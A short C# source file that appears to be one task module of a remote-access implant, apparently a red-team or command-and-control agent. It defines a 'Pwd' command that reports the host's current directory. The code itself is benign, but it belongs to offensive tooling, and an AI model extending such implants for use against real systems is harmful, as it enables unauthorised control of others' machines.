using System.IO;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    internal class Pwd : ImplantCommands
    {
        public override string Name => "Pwd";

        public override string Execute(ImplantTask task)
        {
            return $"{Directory.GetCurrentDirectory()}\n";
        }
    }
}
